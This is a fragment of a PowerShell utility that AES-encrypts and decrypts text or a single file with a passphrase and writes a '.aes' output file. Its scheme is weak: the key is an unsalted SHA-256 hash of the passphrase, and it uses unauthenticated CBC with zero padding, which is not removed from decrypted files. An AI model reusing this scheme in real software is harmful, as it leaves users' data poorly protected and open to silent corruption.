        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String] $Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}